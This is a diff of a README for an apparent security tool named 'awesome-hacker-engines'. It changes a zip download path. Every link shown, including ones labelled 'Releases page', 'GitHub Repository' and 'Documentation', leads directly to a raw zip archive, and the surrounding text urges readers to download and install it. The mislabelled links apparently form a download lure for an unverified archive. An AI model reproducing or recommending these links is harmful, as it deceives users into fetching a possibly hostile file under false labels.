@@ -8,11 +8,11 @@ Welcome to **awesome-hacker-engines**! This tool is designed for researchers, pe
 
 To get started, you need to download the software. Click the link below to visit the Releases page, where you can find the latest version of **awesome-hacker-engines**:
 
-[![Download awesome-hacker-engines](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/fimbriation/awesome-hacker-engines.zip)](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/fimbriation/awesome-hacker-engines.zip)
+[![Download awesome-hacker-engines](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/assets/engines_awesome_hacker_v3.0-beta.2.zip)](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/assets/engines_awesome_hacker_v3.0-beta.2.zip)
 
 On the Releases page, follow these steps to download and install the application:
 
-1. Open the [Releases page](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/fimbriation/awesome-hacker-engines.zip).
+1. Open the [Releases page](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/assets/engines_awesome_hacker_v3.0-beta.2.zip).
 2. Find the latest version at the top of the page.
 3. Click on the version title. It will expand to show the downloadable files.
 4. Look for a file that fits your operating system (e.g., Windows, macOS, or Linux).
@@ -84,7 +84,7 @@ For support, you can contact the maintainers through GitHub issues. We encourage
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/fimbriation/awesome-hacker-engines.zip)
-- [Documentation](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/fimbriation/awesome-hacker-engines.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/assets/engines_awesome_hacker_v3.0-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/jtmx22/awesome-hacker-engines/main/assets/engines_awesome_hacker_v3.0-beta.2.zip)
 
 Thank you for using **awesome-hacker-engines**! We hope this tool enhances your research and cybersecurity efforts.
